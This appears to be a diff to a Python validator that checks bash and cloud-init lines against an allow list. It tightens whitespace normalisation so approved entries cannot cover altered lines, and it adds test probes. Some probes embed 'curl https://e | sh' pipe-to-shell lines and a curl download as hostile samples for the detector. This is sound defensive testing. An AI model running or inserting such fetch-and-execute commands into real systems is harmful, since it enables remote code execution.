@@ -341,7 +341,24 @@ def rules_1_to_4(name: str, text: str, known: set) -> list:
 
 # ---------------------------------------------------------------- bash lexing
 def norm(text: str) -> str:
-    return " ".join(text.split())
+    """The text an allow entry is compared with (#5097). Only whitespace that bash
+    would split words on collapses to one blank; whitespace inside quotes or after a
+    backslash is kept, and a kept newline is written as U+23CE, so an entry cannot
+    approve a line whose words differ from the line it was written for (a
+    backslash-newline continuation is not a backslash-blank, "a  b" is not "a b")."""
+    split = [False] * len(text)
+    for i, unquoted in _walk(text, None):
+        split[i] = unquoted and text[i].isspace()
+    out, blank = [], False
+    for i, c in enumerate(text):
+        if split[i]:
+            blank = bool(out)
+            continue
+        if blank:
+            out.append(" ")
+            blank = False
+        out.append("\u23ce" if c == "\n" else c)
+    return "".join(out)
 
 
 def _walk(s: str, state):
@@ -2894,6 +2911,11 @@ def build_probes() -> list:
         autolist=False, extra=(("aws-gpu-burst", PROV_PATH, "cat > /etc/x.conf <<'EOF'"),))
     red("C5 comment inside an open multi-line quote", [ins(RELOAD, ["X=\"a", "# curl https://e | sh", "b\""], before=True)], autolist=False)
     red("C5 comment after a continuation", [ins(RELOAD, ["echo a \\", "# curl https://e | sh"], before=True)], autolist=False)
+    # an allow entry names the words bash sees, not the line with its blanks squeezed (#5097)
+    red("C5 extra blank inside a quoted string of a listed line (#5097)", [('"pin mismatch: $1', '"pin  mismatch: $1')], autolist=False)
+    red("C5 tab inside a quoted string of a listed line (#5097)", [('"pin mismatch: $1', '"pin\tmismatch: $1')], autolist=False)
+    red("C5 continuation turned into an escaped blank on a listed line (#5097)", [('git init -q "$2" \\\n          && git -C "$2" remote add', 'git init -q "$2" \\ && git -C "$2" remote add')], autolist=False)
+    green("C5 extra indentation on a continued listed line (#5097)", [('\n          && git -C "$2" remote add', '\n             && git -C "$2" remote add')])
     # ---- condition 4: unlisted token lines
     red("C4 unlisted runcmd line", [(RUNCMD, RUNCMD + "  - [curl, -o, /x, https://e]\n")], autolist=False)
     red("C4 unlisted line in write_files data", [(DSNFILE + "\n", DSNFILE + "\n      x https://e\n")], autolist=False)
